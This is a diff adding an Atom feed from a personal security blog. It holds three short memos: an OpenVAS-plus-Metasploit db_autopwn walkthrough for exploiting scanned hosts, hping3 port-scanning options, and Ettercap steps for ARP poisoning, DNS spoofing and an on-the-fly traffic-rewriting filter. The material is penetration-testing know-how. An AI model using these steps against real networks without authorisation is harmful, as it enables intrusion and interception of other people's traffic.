@@ -1,0 +1,312 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Linux Security | Robin David]]></title>
+  <link href="http://www.robindavid.fr/blog/categories/linux-security/atom.xml" rel="self"/>
+  <link href="http://www.robindavid.fr/"/>
+  <updated>2014-03-02T11:00:09+00:00</updated>
+  <id>http://www.robindavid.fr/</id>
+  <author>
+    <name><![CDATA[Robin David]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[OpenVAS memo]]></title>
+    <link href="http://www.robindavid.fr/blog/2010/10/15/openvas-memo/"/>
+    <updated>2010-10-15T00:00:00+00:00</updated>
+    <id>http://www.robindavid.fr/blog/2010/10/15/openvas-memo</id>
+    <content type="html"><![CDATA[<p>OpenVAS is more or less the equivalent for Nessus, in the free world. Let&rsquo;s try to do an audit of a server.</p>
+
+<br/><h5>OpenVAS audit</h5>
+
+
+<ul>
+    <li>On the server :
+<ul>
+    <li>install :
+<ul>
+    <li><strong>openvas-server</strong> and <strong>openvas-plugins</strong></li>
+</ul>
+</li>
+    <li>Update plugins :
+<ul>
+    <li><strong>openvas-nvt-sync</strong></li>
+</ul>
+</li>
+    <li>Create a server certificate :
+<ul>
+    <li><strong>openvas-mkcert</strong></li>
+</ul>
+</li>
+    <li>Create a user :
+<ul>
+    <li><strong>openvas-adduser</strong></li>
+</ul>
+</li>
+    <li>Finally launch the deamon :
+<ul>
+    <li><strong>openvasd -D</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+    <li>On the client :
+<ul>
+    <li>Install :
+<ul>
+    <li><strong>openvas-client</strong> (or something like that)</li>
+</ul>
+</li>
+    <li>launch :
+<ul>
+    <li><strong>OpenVAS-Client</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+    <li>Create a task and a scope on the client. Activate all plugins, connect to the server and launch the audit. Wait ...</li>
+    <li>Save the result in the Nessus format. To do this select the result and do export in "nbe" format.</li>
+</ul>
+
+
+<br/>
+
+
+<p>Now that we have retrieve lot&rsquo;s of informations about the server, we just have to try to exploit them with metasploit.</p>
+
+<p>On the client launch :<strong> msfconsole</strong></p>
+
+<br/>
+
+
+<p><span style="color: #0000ff;">Note: You need to install the metasploit framework before.</span></p>
+
+<ul>
+    <li>In the msfconsole prompt try to create a new database with :</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>db_connect my_scan</strong></p>
+
+
+<p style="padding-left: 30px;"><span style="color: #0000ff;">Note : If everything works fine you're lucky, otherwise you should try to find the missing packet or shared library. Considering that the sql database use is sqlite.</span></p>
+
+
+
+
+<ul>
+    <li>You should now import the report :</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>db_import_nessus_nbe report.nbe</strong></p>
+
+
+<p style="padding-left: 30px;"></p>
+
+
+
+
+<ul>
+    <li>You could see somes report informations with the following commands:</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>db_vulns,db_services,db_hosts</strong></p>
+
+
+
+
+<ul>
+    <li>You now just have to launch the autopwn:</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>db_autopwn -t -x -b -e</strong></p>
+
+
+
+
+<ul>
+    <li>If vulnerability are successfully exploited sessions are created(with a meterpreter session for ex). To see sessions type :</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>sessions -l</strong></p>
+
+
+
+
+<ul>
+    <li>And select anyone with :</li>
+</ul>
+
+
+<p style="padding-left: 30px;"><strong>sessions -i [number]</strong></p>
+
+
+<br/><br/>
+
+
+<h5>Another alternative is to use nmap to create the report</h5>
+
+
+<p>By this way you don&rsquo;t need to install anything on the server. You just need nmap on the client.</p>
+
+<ul>
+    <li>We create a new database :
+<ul>
+    <li><strong>db_connect scan_nmap</strong></li>
+</ul>
+</li>
+    <li>Launch the scan of  the server :
+<ul>
+    <li><strong>db_nmap -T4 -F 192.168.1.0-254</strong></li>
+</ul>
+</li>
+    <li>Like above we can see informations with these commands :
+<ul>
+    <li><strong>db_hosts,db_services,db_vulns</strong></li>
+</ul>
+</li>
+    <li>We launch the autopwn :
+<ul>
+    <li><strong>db_autopwn -t -p -b -e</strong></li>
+</ul>
+</li>
+    <li>If exploitation succeed sessions are created :
+<ul>
+    <li><strong>sessions -l</strong></li>
+</ul>
+</li>
+    <li>And you can connect to with :
+<ul>
+    <li><strong>sessions -i [number]</strong></li>
+</ul>
+</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hping3 memo]]></title>
+    <link href="http://www.robindavid.fr/blog/2010/10/15/hping3-memo/"/>
+    <updated>2010-10-15T00:00:00+00:00</updated>
+    <id>http://www.robindavid.fr/blog/2010/10/15/hping3-memo</id>
+    <content type="html"><![CDATA[<p>Below a memo about hping3&hellip;</p>
+
+<div id="_mcePaste">
+<ul>
+    <li>Importants options :
+<ul>
+    <li><strong>-i</strong> define the interval time between each packet in sec.</li>
+    <li><strong>-c</strong> define the number of packets to send (without wait Ctrl+c to end)</li>
+    <li><strong>-V</strong> verbose mode</li>
+    <li><strong>-p</strong> port</li>
+    <li><strong>-2</strong> for UDP (without it's TCP)</li>
+    <li>But there is too:
+<ul>
+    <li><strong>-0</strong> raw ip</li>
+    <li><strong>-1</strong> icmp</li>
+    <li><strong>-8</strong> scan</li>
+    <li><strong>-9</strong> listen mode</li>
+</ul>
+</li>
+    <li><strong>-d</strong> Allow to change the body size of the packet (default 0)</li>
+    <li><strong>-S</strong> to put SYN flag to 1, but there is too -A for ACK, R RST, P PUSH, F FIN et U URG</li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+<div id="_mcePaste">
+<ul>
+    <li>Few examples :
+<ul>
+    <li><strong>hping3 -V -c 1 -2 -p 2048 192.168.1.15</strong></li>
+    <li>Send one UDP packet on the port 2048 of the host 192.168.1.15.</li>
+    <li><strong>hping3 -c 1 -S -p 23 192.168.1.15</strong></li>
+    <li>Use the flag SYN (-S), to try establish a connection (if server return syn=1 ack=1 port is open)</li>
+    <li><strong>hping3 -S 192.168.1.15 -p ++21</strong></li>
+    <li>Scan the specified host from port 21</li>
+    <li><span style="color: #0000ff;">Note: Hping print just those who answer (SA)</span></li>
+    <li><strong>hping3 -V --scan "20-90" -S 192.168.1.15</strong></li>
+    <li>Scan a port range (20-90)</li>
+</ul>
+</li>
+</ul>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Ettercap memo]]></title>
+    <link href="http://www.robindavid.fr/blog/2010/10/15/ettercap-memo/"/>
+    <updated>2010-10-15T00:00:00+00:00</updated>
+    <id>http://www.robindavid.fr/blog/2010/10/15/ettercap-memo</id>
+    <content type="html"><![CDATA[<h2>ARP poisoning</h2>
+
+<ol>
+<li>Launch ettercap in root</li>
+<li>Sniff/Unified .. / eth0</li>
+<li>Host/scan for hosts (do it multiples times to find more</li>
+<li>Host list to see all available hosts</li>
+<li>Add the gateway in target 1</li>
+<li>Add the victim in target 2</li>
+<li>Menu mitm / arp poisoning</li>
+</ol>
+
+
+<h2>DNS Poisoning</h2>
+
+<p>edit <em>/usr/local/share/ettercap/etter.dns</em> or <em>/usr/share/ettercap/etter.conf</em>
+and change for instance:</p>
+
+<p>microsoft.com A 198.12.196.56</p>
+
+<p>by</p>
+
+<p>microsoft.com A 192.168.1.16</p>
+
+<p>Don&rsquo;t forget to activate <strong>DNS Spoof</strong> in plugins</p>
+
+<h2>Filters</h2>
+
+<p>Allow to change word on the fly in trafic</p>
+
+<ol>
+<li>edit <em>/usr/local/share/ettercap/etter.filter</em> or <em>/usr/share/ettercap/etter.filter</em></li>
+<li>Add for instance:</li>
+</ol>
+
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (ip.proto == TCP &amp;&amp; search(DATA.data, &ldquo;rocks&rdquo;) ) {&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>log(DATA.data, "/tmp/alter_ettercap.log");
+</span><span class='line'>replace("rocks", "sucks");
+</span><span class='line'>msg("Rocks substituted and logged.\n");
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>}</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>The filter file shoud then be &ldquo;compiled&rdquo; with: <strong>etterfilter -o fichier.ef etter.filter</strong></p>
+
+<p>And load the filter in filter/load a filter</p>
+]]></content>
+  </entry>
+  
+</feed>
